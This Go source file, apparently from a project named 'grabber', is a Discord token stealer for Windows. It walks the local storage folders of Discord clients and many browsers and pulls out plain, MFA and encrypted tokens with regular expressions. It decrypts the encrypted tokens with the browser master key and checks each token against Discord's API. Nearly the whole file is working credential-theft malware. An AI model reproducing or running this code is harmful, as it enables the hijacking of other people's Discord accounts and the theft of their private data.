package discord

import (
	"encoding/base64"
	"fmt"
	"os"
	"regexp"
	"strings"

	"net/http"

	"example.com/grabber/decryption"
)

var ids []int64

var baseurl string = "https://discord.com/api/v9/users/@me"

var local string = os.Getenv("LOCALAPPDATA")
var roaming string = os.Getenv("APPDATA")
var temp string = os.Getenv("TEMP")

var token_paths = map[string]string{
	"Discord":        roaming + "\\discord\\Local Storage\\leveldb\\",
	"Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
	"Discord PTB":    roaming + "\\discordptb\\Local Storage\\leveldb\\",
	"Chrome":         local + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
	"Chrome1":        local + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
	"Chrome2":        local + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
	"Chrome3":        local + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
	"Chrome4":        local + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
	"Chrome5":        local + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
	"Yandex":         local + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
	"Opera":          local + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
	"Opera GX":       local + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
	"Amigo":          local + "\\Amigo\\User Data\\Default\\Local Storage\\leveldb\\",
	"Torch":          local + "\\Torch\\User Data\\Default\\Local Storage\\leveldb\\",
	"Kometa":         local + "\\Kometa\\User Data\\Default\\Local Storage\\leveldb\\",
	"Orbitum":        local + "\\Orbitum\\User Data\\Default\\Local Storage\\leveldb\\",
	"CentBrowser":    local + "\\CentBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
}

type Tokens struct {
	Token    string `json:"token"`
	ID       int64  `json:"id"`
	Username string `json:"username"`
	Email    string `json:"email"`
	Password string `json:"password"`
}

func GetTokens() []string {
	var tokens_current []string
	var final_tokens []string
	for _, path := range token_paths {
		if _, err := os.Stat(path); err == nil {
			files_out, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, file := range files_out {
				if strings.HasSuffix(file.Name(), ".ldb") || strings.HasSuffix(file.Name(), ".log") {

					data, err := os.ReadFile(path + file.Name())
					if err != nil {
						continue
					}

					normal_regex_mem, err := regexp.Compile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`)
					if err == nil {
						if string(normal_regex_mem.Find(data)) != "" {
							t := string(normal_regex_mem.Find(data))
							tokens_current = append(tokens_current, t)
						}
					}

					encrypted_regex_mem, err := regexp.Compile(`dQw4w9WgXcQ:[^\"]*`)
					if err == nil {
						if string(encrypted_regex_mem.Find(data)) != "" {
							t := string(encrypted_regex_mem.Find(data))
							good_code := strings.Split(t, ":")[1]
							decoded, err := base64.StdEncoding.DecodeString(good_code)
							if err != nil {
								continue
							}
							good_dir_local_state := strings.Split(path, "\\")

							first6 := good_dir_local_state[:6]
							result := strings.Join(first6, "\\") + "\\Local State"
							good_key := decryption.GetMasterKey(result)
							decrypted, _ := decryption.DecryptPassword(decoded, good_key)
							tokens_current = append(tokens_current, decrypted)
						}
					}

					mfa_token_mem, err := regexp.Compile(`mfa\.[\w-]{84}`)
					if err == nil {
						if string(mfa_token_mem.Find(data)) != "" {
							t := string(mfa_token_mem.Find(data))
							tokens_current = append(tokens_current, t)
						}
					}
				}
			}
		} else {
			continue
		}
	}
	for _, token := range tokens_current {
		if CheckToken(token) {
			final_tokens = append(final_tokens, token)
		}
	}
	//remove duplicates
	final_tokens = removeDuplicates(final_tokens)

	//convert final_tokens to json
	info := GetTokenInfo(final_tokens[0])
	fmt.Println(info)
	return final_tokens
}

func removeDuplicates(elements []string) []string {
	encountered := map[string]bool{}
	result := []string{}

	for v := range elements {
		if encountered[elements[v]] {
		} else {
			encountered[elements[v]] = true
			result = append(result, elements[v])
		}
	}
	return result
}

func CheckToken(token string) bool {
	req, err := http.NewRequest("GET", baseurl, nil)
	if err != nil {
		return false
	}
	req.Header.Set("Authorization", token)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	if resp.StatusCode == 200 {
		return true
	}
	return false
}

func GetTokenInfo(token string) Tokens {
	req, err := http.NewRequest("GET", baseurl, nil)
	if err != nil {
		return Tokens{}
	}
	req.Header.Set("Authorization", token)
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return Tokens{}
	}
	if resp.StatusCode == 200 {
		return Tokens{}
	}
	fmt.Println(resp)
	return Tokens{}
}
